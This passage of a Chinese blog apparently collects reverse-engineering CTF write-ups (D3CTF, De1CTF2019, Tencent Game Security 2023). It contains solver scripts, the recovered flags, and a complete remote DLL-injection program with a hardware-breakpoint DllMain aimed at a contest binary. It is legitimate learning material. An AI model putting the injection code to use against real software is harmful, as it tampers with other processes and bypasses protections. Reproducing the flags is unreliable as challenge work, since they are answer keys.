class="number">0x35</span>, <span class="number">0x5C</span>, <span class="number">0x72</span>, <span class="number">0xE0</span>, <span class="number">0x86</span>, <span class="number">0xDE</span>,</span><br><span class="line">        <span class="number">0x73</span>, <span class="number">0x9F</span>, <span class="number">0x9A</span>, <span class="number">0xF6</span>, <span class="number">0x0D</span>, <span class="number">0xDC</span>, <span class="number">0xC8</span>, <span class="number">0x4F</span>, <span class="number">0xC2</span>, <span class="number">0xA4</span>, <span class="number">0x7A</span>, <span class="number">0xB5</span>, <span class="number">0xE3</span>, <span class="number">0xCD</span>, <span class="number">0x60</span>, <span class="number">0x9D</span>, <span class="number">0x04</span>, <span class="number">0x1F</span>]</span><br><span class="line"></span><br><span class="line">enc = [<span class="number">0xb8</span>, <span class="number">0x86</span>, <span class="number">0x44</span>, <span class="number">0x63</span>, <span class="number">0xb5</span>, <span class="number">0xd8</span>, <span class="number">0x1c</span>, <span class="number">0x95</span>,</span><br><span class="line">       <span class="number">0xd1</span>, <span class="number">0x7e</span>, <span class="number">0x70</span>, <span class="number">0x5e</span>, <span class="number">0xbc</span>, <span class="number">0x56</span>, <span class="number">0x63</span>, <span class="number">0x34</span>,</span><br><span class="line">       <span class="number">0x28</span>, <span class="number">0x90</span>, <span class="number">0x15</span>, <span class="number">0xf8</span>, <span class="number">0x4d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0x1e</span>,</span><br><span class="line">       <span class="number">0xf5</span>, <span class="number">0x1f</span>, <span class="number">0xc8</span>, <span class="number">0x64</span>, <span class="number">0x52</span>, <span class="number">0x1b</span>, <span class="number">0x64</span>, <span class="number">0x0f</span>,</span><br><span class="line">       <span class="number">0x24</span>, <span class="number">0x93</span>, <span class="number">0x40</span>, <span class="number">0x5d</span>, <span class="number">0x84</span>, <span class="number">0x93</span>, <span class="number">0x7d</span>, <span class="number">0x92</span>,</span><br><span class="line">       <span class="number">0x0a</span>]</span><br><span class="line"></span><br><span class="line">ks = [<span class="number">0x35</span>, <span class="number">0x4b</span>, <span class="number">0xa0</span>, <span class="number">0x60</span>, <span class="number">0x08</span>, <span class="number">0x50</span>, <span class="number">0xa5</span>, <span class="number">0xf1</span>,</span><br><span class="line">      <span class="number">0x33</span>, <span class="number">0x97</span>, <span class="number">0xb2</span>, <span class="number">0x13</span>, <span class="number">0xcb</span>, <span class="number">0x4c</span>, <span class="number">0x0d</span>, <span class="number">0xcf</span>,</span><br><span class="line">      <span class="number">0xa3</span>, <span class="number">0x7c</span>, <span class="number">0x57</span>, <span class="number">0x53</span>, <span class="number">0xe2</span>, <span class="number">0xa9</span>, <span class="number">0x65</span>, <span class="number">0x4e</span>,</span><br><span class="line">      <span class="number">0x0e</span>, <span class="number">0xc7</span>, <span class="number">0x7a</span>, <span class="number">0x0f</span>, <span class="number">0xfd</span>, <span class="number">0xb5</span>, <span class="number">0x9e</span>, <span class="number">0xb4</span>,</span><br><span class="line">      <span class="number">0x33</span>, <span class="number">0xf9</span>, <span class="number">0x61</span>, <span class="number">0xd3</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(flag), <span class="number">2</span>):</span><br><span class="line">    flag[i + <span class="number">1</span>] = flag[i] - (flag[i + <span class="number">1</span>] ^ ks[i + <span class="number">1</span>])</span><br><span class="line">    flag[i] = (flag[i] ^ ks[i]) - flag[i + <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    flag[i] ^= enc[i]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(i &amp; <span class="number">0xff</span>), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></div></figure><p>getting_primes_with_pipes_is_awesome</p>        <h2 id="d3recover"   >          <a href="#d3recover" class="heading-link"><i class="fas fa-link"></i></a><a href="#d3recover" class="headerlink" title="d3recover"></a>d3recover</h2>      <p>附件是两个文件ver1无符号而ver2有符号</p><p>利用bindiff恢复符号</p><p>找到可疑的函数</p><p><img src="https://raw.githubusercontent.com/meiyouyandeyu/MyImagepost/main/img/202305112112068.png" alt="image-20230511211205029"></p><p>看起来很复杂但是很多都是对函数异常时的处理，只要关注其调用的python函数即可</p><p><img src="https://raw.githubusercontent.com/meiyouyandeyu/MyImagepost/main/img/202305112113969.png" alt="image-20230511211306925"></p><p>简单化简一下逻辑</p><figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line">input[i] ^= <span class="number">0x23</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">29</span>; i++) &#123;</span><br><span class="line"><span class="type">int</span> x1 = input[i];</span><br><span class="line"><span class="type">int</span> x2 = input[i+<span class="number">2</span>];</span><br><span class="line">input[i] = (x1 + x2) ^ <span class="number">0x54</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><p>然后就是猜了，看了别的师傅的wp，可以通过调试来调试出最后做比较的字符</p><p>但是我找不到。</p><p>留意到有一串疑似经过base64加密的字符串</p><p><img src="https://raw.githubusercontent.com/meiyouyandeyu/MyImagepost/main/img/202305112225327.png" alt="image-20230511222518281"></p><p>长度也对的上，将其base64解码后再解密</p><p><img src="https://raw.githubusercontent.com/meiyouyandeyu/MyImagepost/main/img/202305112225111.png" alt="image-20230511222556078"></p><figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> input[<span class="number">32</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> flag[] = &#123;</span><br><span class="line">    <span class="number">0xd3</span>,<span class="number">0xc7</span>,<span class="number">0xce</span>,<span class="number">0xca</span>,<span class="number">0x3f</span>,<span class="number">0x84</span>,<span class="number">0xdb</span>,<span class="number">0xb3</span>,<span class="number">0xb6</span>,<span class="number">0xb9</span>,<span class="number">0x80</span>,<span class="number">0xea</span>,<span class="number">0xd0</span>,<span class="number">0xcd</span>,<span class="number">0x72</span>,<span class="number">0xfc</span>,</span><br><span class="line">    <span class="number">0xd8</span>,<span class="number">0x30</span>,<span class="number">0x95</span>,<span class="number">0xdb</span>,<span class="number">0xe2</span>,<span class="number">0xd8</span>,<span class="number">0x92</span>,<span class="number">0x08</span>,<span class="number">0xc1</span>,<span class="number">0xc6</span>,<span class="number">0xc5</span>,<span class="number">0xf4</span>,<span class="number">0x07</span>,<span class="number">0xec</span>,<span class="number">0x02</span>,<span class="number">0x5e</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">29</span>; i++) &#123;</span><br><span class="line">        flag[i] ^= <span class="number">0x54</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">29</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">        flag[i] -= flag[i+<span class="number">2</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, flag[i]^<span class="number">0x23</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><p>flag{y0U_RE_Ma5t3r_0f_R3vocery!}</p>        <h2 id="d3syscall"   >          <a href="#d3syscall" class="heading-link"><i class="fas fa-link"></i></a><a href="#d3syscall" class="headerlink" title="d3syscall"></a>d3syscall</h2>      <p>ida64</p><p><img src="https://raw.githubusercontent.com/meiyouyandeyu/MyImagepost/main/img/202305060009061.png" alt="image-20230506000957959"></p><p>点开函数，发现全是自己定义的Linux系统调用</p><p><img src="https://raw.githubusercontent.com/meiyouyandeyu/MyImagepost/main/img/202305060010356.png" alt="image-20230506001045316"></p><p>找到注册的函数下断，然后将生成的my_module文件丢进ida</p><p><img src="https://raw.githubusercontent.com/meiyouyandeyu/MyImagepost/main/img/202305060021426.png" alt="image-20230506002136378"></p><p>my_module中定义了每个系统调用号对应的函数，发现是个虚拟机</p><p><img src="https://raw.githubusercontent.com/meiyouyandeyu/MyImagepost/main/img/202305060022617.png" alt="image-20230506002253557"></p><p>最后写脚本</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> z3</span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag = [<span class="number">0xB0800699CB89CC89</span>, <span class="number">0x4764FD523FA00B19</span>,</span><br><span class="line">        <span class="number">0x396A7E6DF099D700</span>, <span class="number">0xB115D56BCDEAF50A</span>,</span><br><span class="line">        <span class="number">0x2521513C985791F4</span>, <span class="number">0xB03C06AF93AD0BE</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">6</span>, <span class="number">2</span>):</span><br><span class="line">    s = Solver()</span><br><span class="line">    reg = [BitVec(<span class="string">&#x27;reg[%d]&#x27;</span> % i, <span class="number">64</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>)]</span><br><span class="line"></span><br><span class="line">    ans1 = reg[<span class="number">1</span>] + (((reg[<span class="number">0</span>] &lt;&lt; <span class="number">3</span>) + <span class="number">0x51e7647e</span>) ^ ((reg[<span class="number">0</span>] * <span class="number">3</span>) + <span class="number">0x0E0B4140A</span>) ^ (reg[<span class="number">0</span>] + <span class="number">0x0E6978F27</span>))</span><br><span class="line">    ans2 = reg[<span class="number">0</span>] + (((ans1 &lt;&lt; <span class="number">6</span>) + <span class="number">0x53A35337</span>) ^ ((ans1 * <span class="number">5</span>) + <span class="number">0x9840294D</span>) ^ (ans1 - <span class="number">0x5EAE4751</span>))</span><br><span class="line"></span><br><span class="line">    s.add(flag[i] == ans1 &amp; <span class="number">0xffffffffffffffff</span>)</span><br><span class="line">    s.add(flag[i + <span class="number">1</span>] == ans2 &amp; <span class="number">0xffffffffffffffff</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> s.check() == z3.sat:</span><br><span class="line">        result = s.model()</span><br><span class="line">        <span class="keyword">for</span> each <span class="keyword">in</span> reg:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">hex</span>(result[each].as_long()), end=<span class="string">&quot;, &quot;</span>)</span><br></pre></td></tr></table></div></figure><figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> flag[] = &#123;</span><br><span class="line">        <span class="number">0x65637b6674633364</span>, <span class="number">0x322d343939623966</span>, <span class="number">0x343438342d373435</span>, <span class="number">0x30612d643063612d</span>, <span class="number">0x3630383537623739</span>, <span class="number">0x7d3061</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> x = flag[i];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">8</span>; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, x&amp;<span class="number">0xff</span>);</span><br><span class="line">            x &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><p>d3ctf{cef9b994-2547-4844-ac0d-a097b75806a0}</p>        <h2 id="d3hell"   >          <a href="#d3hell" class="heading-link"><i class="fas fa-link"></i></a><a href="#d3hell" class="headerlink" title="d3hell"></a>d3hell</h2>      <p>To be continue……</p>]]></content>
      
      
      <categories>
          
          <category> rewp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>De1CTF2019_cplusplus</title>
      <link href="/2023/04/27/De1CTF2019-cplusplus/"/>
      <url>/2023/04/27/De1CTF2019-cplusplus/</url>
      
        <content type="html"><![CDATA[        <h2 id="De1CTF2019-cplusplus"   >          <a href="#De1CTF2019-cplusplus" class="heading-link"><i class="fas fa-link"></i></a><a href="#De1CTF2019-cplusplus" class="headerlink" title="[De1CTF2019]cplusplus"></a>[De1CTF2019]cplusplus</h2>      <p>64位</p><p>这道题大意是输入一个格式为123@123#123的字符串</p><p>然后进行校验</p><p>后面两段的非常简单的，难度在与第一段</p><p>后两段：</p><p><img src="https://raw.githubusercontent.com/meiyouyandeyu/MyImagepost/main/img/202304270105895.png" alt="image-20230427010551840"></p><p>第一段</p><p><img src="https://raw.githubusercontent.com/meiyouyandeyu/MyImagepost/main/img/202304270106330.png" alt="image-20230427010609309"></p><p>函数对输入进行了一系列的运算，最终走到v8然后判断是否直接退出</p><p><img src="https://raw.githubusercontent.com/meiyouyandeyu/MyImagepost/main/img/202304270106820.png" alt="image-20230427010637787"></p><p>但是，函数的开头的判断告诉我们输入一定小于111</p><p><img src="https://raw.githubusercontent.com/meiyouyandeyu/MyImagepost/main/img/202304270107123.png" alt="image-20230427010716103"></p><p>于是考虑爆破。模拟整个程序的执行</p><figure class="highlight py"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">111</span>):</span><br><span class="line">    s = <span class="string">&quot;@20637#114&quot;</span></span><br><span class="line">    <span class="built_in">input</span> = <span class="built_in">str</span>(i) + s</span><br><span class="line">    p = subprocess.Popen(<span class="string">&#x27;./Cplusplus.exe&#x27;</span>,</span><br><span class="line">                         stdin=subprocess.PIPE, stdout=subprocess.PIPE)</span><br><span class="line">    out = p.communicate(<span class="built_in">bytes</span>(<span class="built_in">input</span>.encode()))[<span class="number">0</span>]</span><br><span class="line">    out = out.decode()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> out:</span><br><span class="line">        <span class="built_in">print</span>(out)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></div></figure><p>de1ctf{78@20637#114}</p>]]></content>
      
      
      <categories>
          
          <category> rewp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>腾讯游戏安全2023</title>
      <link href="/2023/04/27/%E8%85%BE%E8%AE%AF%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A82023/"/>
      <url>/2023/04/27/%E8%85%BE%E8%AE%AF%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A82023/</url>
      
        <content type="html"><![CDATA[        <h1 id="腾讯游戏安全2023"   >          <a href="#腾讯游戏安全2023" class="heading-link"><i class="fas fa-link"></i></a><a href="#腾讯游戏安全2023" class="headerlink" title="腾讯游戏安全2023"></a>腾讯游戏安全2023</h1>      <p>第一次打腾讯游戏安全，成功进了决赛。</p><p>但决赛不会驱动，第一题也没完全做出来</p><p><img src="https://raw.githubusercontent.com/meiyouyandeyu/MyImagepost/main/img/202304270043414.png" alt="image-20230427004311389"></p>        <h1 id="初赛-PC客户端-解题过程"   >          <a href="#初赛-PC客户端-解题过程" class="heading-link"><i class="fas fa-link"></i></a><a href="#初赛-PC客户端-解题过程" class="headerlink" title="初赛-PC客户端-解题过程"></a>初赛-PC客户端-解题过程</h1>              <h2 id="题目"   >          <a href="#题目" class="heading-link"><i class="fas fa-link"></i></a><a href="#题目" class="headerlink" title="题目"></a>题目</h2>      <p><img src="https://raw.githubusercontent.com/meiyouyandeyu/MyImagepost/main/img/202304270048089.png" alt="image-20230427004804030"></p>        <h2 id="1-获取flag"   >          <a href="#1-获取flag" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-获取flag" class="headerlink" title="1.获取flag"></a>1.获取flag</h2>      <p>直接运行等程序的反调试结束后，暂停程序，对输出的密文下硬件断点。找到如下函数</p><p><img src="https://raw.githubusercontent.com/meiyouyandeyu/MyImagepost/main/img/202304270044336.png" alt="image-20230409161647096"></p><p>估计是换表base64</p><p>跟踪输入的明文，下断点，成功在内存中找到明文</p><p><img src="https://raw.githubusercontent.com/meiyouyandeyu/MyImagepost/main/img/202304270044061.png" alt="image-20230409161754232"></p><p>与解密出的结果一致</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202304091618274.png" alt="image-20230409161829251"></p>        <h2 id="2-写入密文信息变为写入明文成功"   >          <a href="#2-写入密文信息变为写入明文成功" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-写入密文信息变为写入明文成功" class="headerlink" title="2.写入密文信息变为写入明文成功"></a>2.写入密文信息变为写入明文成功</h2>      <p>经调试可得，明文应该只经过了上面已经找到的base64函数</p><p>因此，在函数头下断然后更改eip直接运行到return</p><p>又因为尽可能修改的内存少，选择dll远程注入，仅需修改寄存器和复写明文到输出即可。</p><p>套用远程注入模板</p><p>Inject.cpp</p><figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tlhelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HANDLE hProcessSnap;</span><br><span class="line">PROCESSENTRY32 pe32;</span><br><span class="line"><span class="comment">// 创建进程快照进行遍历</span></span><br><span class="line">hProcessSnap = <span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (hProcessSnap == INVALID_HANDLE_VALUE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">pe32.dwSize = <span class="built_in">sizeof</span>(PROCESSENTRY32);</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">Process32First</span>(hProcessSnap, &amp;pe32))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcessSnap);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//通过进程名来查找contest.exe</span></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">wcscmp</span>(pe32.szExeFile,<span class="string">L&quot;contest.exe&quot;</span>)==<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 打开进程</span></span><br><span class="line">HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);</span><br><span class="line"><span class="type">char</span> strCurrent[MAX_PATH];</span><br><span class="line"><span class="built_in">GetCurrentDirectoryA</span>(MAX_PATH,strCurrent);</span><br><span class="line"><span class="type">char</span> strDllPath[MAX_PATH];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 拼接dll路径</span></span><br><span class="line"><span class="built_in">sprintf_s</span>(strDllPath, <span class="string">&quot;%s\\patch.dll&quot;</span>, strCurrent);</span><br><span class="line">HMODULE hModule = <span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;kernel32.dll&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取LoadLibraryA函数地址</span></span><br><span class="line">PVOID ProcAdd = <span class="built_in">GetProcAddress</span>(hModule, <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line">PVOID ParaAddr = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">NULL</span>, <span class="built_in">strlen</span>(strDllPath) + <span class="number">1</span>, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line"><span class="built_in">WriteProcessMemory</span>(hProcess, ParaAddr, strDllPath, <span class="built_in">strlen</span>(strDllPath) + <span class="number">1</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建远程线程</span></span><br><span class="line">DWORD threadid = <span class="number">0</span>;</span><br><span class="line">HANDLE hThread = <span class="literal">NULL</span>;</span><br><span class="line">hThread = <span class="built_in">CreateRemoteThread</span>(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)ProcAdd, ParaAddr, <span class="number">0</span>, &amp;threadid);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 等待线程结束</span></span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hThread, INFINITE);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 释放资源</span></span><br><span class="line"><span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcessSnap);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="built_in">Process32Next</span>(hProcessSnap, &amp;pe32));</span><br><span class="line"><span class="comment">//没有查找到进程</span></span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcessSnap);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><p>DLLmain.cpp</p><figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">(HMODULE hModule,DWORD  ul_reason_for_call,LPVOID lpReserved)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">switch</span> (ul_reason_for_call) &#123;</span><br><span class="line"><span class="keyword">case</span> DLL_PROCESS_ATTACH: &#123;</span><br><span class="line"><span class="comment">// 注册VEH异常</span></span><br><span class="line"><span class="built_in">AddVectoredExceptionHandler</span>(<span class="number">1</span>, ExceptionHandler);</span><br><span class="line">DWORD dwProcessID = <span class="built_in">GetCurrentProcessId</span>();</span><br><span class="line">THREADENTRY32 te32 = &#123; <span class="built_in">sizeof</span>(te32) &#125;;</span><br><span class="line">HANDLE hThreadSnap = <span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPTHREAD, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">Thread32First</span>(hThreadSnap, &amp;te32)) &#123;</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (dwProcessID == te32.th32OwnerProcessID)</span><br><span class="line">&#123;</span><br><span class="line">dwMainThreadId = te32.th32ThreadID;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="built_in">Thread32Next</span>(hThreadSnap, &amp;te32));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置硬件断点</span></span><br><span class="line"><span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="literal">NULL</span>, breakpoint, (LPVOID)dwMainThreadId, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line"><span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line"><span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><p>设置硬件断点时要先挂起线程再进行设置</p><figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 设置硬件断点</span></span><br><span class="line"><span class="function">DWORD <span 